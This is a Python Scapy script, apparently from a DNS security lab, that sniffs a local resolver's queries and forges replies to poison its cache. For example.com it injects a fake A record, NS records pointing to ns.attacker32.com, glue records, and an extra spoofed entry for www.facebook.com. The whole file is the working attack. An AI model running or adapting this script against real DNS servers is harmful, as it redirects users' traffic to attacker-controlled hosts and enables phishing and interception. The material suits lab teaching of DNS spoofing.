#!/usr/bin/env python3
from scapy.all import *
import sys

"""
Flush the DNS cache on local DNS server before with
rndc flush 
"""

# --- CONFIGURATION ---
TARGET_DOMAIN = 'example.com'
FAKE_NS_ATTACKER = 'ns.attacker32.com.'
FAKE_NS_EXAMPLE = 'ns.example.com.'
IFACE = 'br-1d24810f49e2'


def spoof_dns(pkt):
        if (DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0):
                qname = pkt[DNS].qd.qname.decode('utf-8')

                if TARGET_DOMAIN in qname:
                        # 1. IP and UDP Headers (Standard swap)
                        ip = IP(dst=pkt[IP].src, src=pkt[IP].dst) # Create an IP object
                        udp = UDP(dport=pkt[UDP].sport, sport=53) # Create a UPD object

                        # 2. ANSWER SECTION (The fake IP for the specific query)
                        ans_sec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', rdata='4.3.3.4',ttl=259200)
                        
                        # 3. AUTHORITY SECTION (The Core of the Attack)
                        ns_sec1 = DNSRR(rrname=TARGET_DOMAIN, type='NS', rdata=FAKE_NS_ATTACKER, ttl=259200)
                        ns_sec2 = DNSRR(rrname=TARGET_DOMAIN, type='NS', rdata=FAKE_NS_EXAMPLE, ttl=259200)

                        # 4. ADDITIONAL SECTION (Glue Record)
                        add_sec1 = DNSRR(rrname=FAKE_NS_ATTACKER, type='A', rdata='1.2.3.4', ttl=259200)
                        add_sec2 = DNSRR(rrname=FAKE_NS_EXAMPLE, type='A', rdata='5.6.7.8', ttl=259200)
                        add_sec3 = DNSRR(rrname='www.facebook.com.', type='A', rdata='3.4.5.6', ttl=259200)

                        # 5. CONSTRUCT DNS PACKET
                        dns = DNS(id=pkt[DNS].id,qd=pkt[DNS].qd, aa=1, qr=1, qdcount=1, ancount=1, an=ans_sec, nscount=2, ns=ns_sec1/ns_sec2, arcount=3, ar=add_sec1/add_sec2/add_sec3)
                        spoofpkt = ip/udp/dns # Assemble the spoofed DNS packet
                        send(spoofpkt) # send(spoofpkt, verbose=0, iface=IFACE)


myFilter = "udp and (src host 10.9.0.53 and dst port 53)" # Set the filter
pkt=sniff(iface='br-1d24810f49e2', filter=myFilter, prn=spoof_dns)